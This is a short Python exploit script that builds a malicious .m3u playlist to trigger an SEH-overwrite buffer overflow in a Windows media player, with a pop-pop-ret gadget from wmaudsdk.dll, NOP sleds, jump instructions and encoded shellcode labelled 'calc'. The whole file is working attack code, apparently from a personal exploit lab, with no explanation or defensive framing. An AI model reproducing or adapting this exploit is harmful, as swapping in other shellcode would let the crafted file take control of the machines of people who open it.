#!/usr/bin/python

import struct

#seh overwrite SEH chain of main thread, item 0 Address=0012FC80 SE handler=41414141

# 0x4211501f : pop esi # pop edi # ret  | ascii {PAGE_EXECUTE_READ} [wmaudsdk.dll]



calc = ("\xbd\xf2\x30\x08\x6b\xd9\xcb\xd9\x74\x24\xf4\x5a\x33\xc9" +
"\xb1\x33\x31\x6a\x12\x03\x6a\x12\x83\x18\xcc\xea\x9e\x20" +
"\xc5\x62\x60\xd8\x16\x15\xe8\x3d\x27\x07\x8e\x36\x1a\x97" +
"\xc4\x1a\x97\x5c\x88\x8e\x2c\x10\x05\xa1\x85\x9f\x73\x8c" +
"\x16\x2e\xbc\x42\xd4\x30\x40\x98\x09\x93\x79\x53\x5c\xd2" +
"\xbe\x89\xaf\x86\x17\xc6\x02\x37\x13\x9a\x9e\x36\xf3\x91" +
"\x9f\x40\x76\x65\x6b\xfb\x79\xb5\xc4\x70\x31\x2d\x6e\xde" +
"\xe2\x4c\xa3\x3c\xde\x07\xc8\xf7\x94\x96\x18\xc6\x55\xa9" +
"\x64\x85\x6b\x06\x69\xd7\xac\xa0\x92\xa2\xc6\xd3\x2f\xb5" +
"\x1c\xae\xeb\x30\x81\x08\x7f\xe2\x61\xa9\xac\x75\xe1\xa5" +
"\x19\xf1\xad\xa9\x9c\xd6\xc5\xd5\x15\xd9\x09\x5c\x6d\xfe" +
"\x8d\x05\x35\x9f\x94\xe3\x98\xa0\xc7\x4b\x44\x05\x83\x79" +
"\x91\x3f\xce\x17\x64\xcd\x74\x5e\x66\xcd\x76\xf0\x0f\xfc" +
"\xfd\x9f\x48\x01\xd4\xe4\xa7\x4b\x75\x4c\x20\x12\xef\xcd" +
"\x2d\xa5\xc5\x11\x48\x26\xec\xe9\xaf\x36\x85\xec\xf4\xf0" +
"\x75\x9c\x65\x95\x79\x33\x85\xbc\x19\xd2\x15\x5c\xf0\x71" +
"\x9e\xc7\x0c")


a = "A" * 260                                 #initial seh crash
jmpeip = "\x71\x06\x70\x04"   #jump if not zero, jump if zero
ppr = struct.pack("<I", 0x4211501f)  #pop pop ret
nopoffset = ("\x90" * 2)               #land in a few nops
jmpforward = "\xeb\x32"           #jump over some of the garbage that isnt controlled
noppad = "\x90" * 50                  #create landing zone for previous jump
c = "C" * (2000 - (len(nopoffset) + len(calc) + len(jmpforward) +  len(noppad)))   #padding


buff = a + jmpeip + ppr + nopoffset + jmpforward + noppad + calc + c

killfile = open("/root/xplab/kill.m3u","w")
killfile.write(buff)
killfile.close()

